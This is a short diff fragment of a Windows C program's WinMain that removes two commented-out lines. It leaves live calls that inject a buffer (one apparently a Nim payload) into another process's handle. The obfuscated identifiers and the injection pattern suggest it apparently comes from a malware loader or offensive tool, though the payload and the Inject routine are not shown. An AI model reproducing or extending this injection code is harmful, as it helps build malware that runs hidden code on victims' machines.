@@ -275,7 +275,6 @@ int WINAPI WinMain(HINSTANCE hREF, HINSTANCE var1,
 
 		//Inject it
 		if (handlll != NULL) {
-			//Inject(handlll, tirosikowloi, kseksiwusolLLOO);
 			Inject(handlll, (unsigned char*)pointToExec, size);
 			CloseHandle(handlll);
 		}
@@ -306,7 +305,6 @@ int WINAPI WinMain(HINSTANCE hREF, HINSTANCE var1,
 
 		//Inject it
 		if (handlll != NULL) {
-			//Inject(handlll, tirosikowloi, kseksiwusolLLOO);
 			Inject(handlll, (unsigned char*)pointToExecNim, sizeNim);
 			CloseHandle(handlll);
 		}
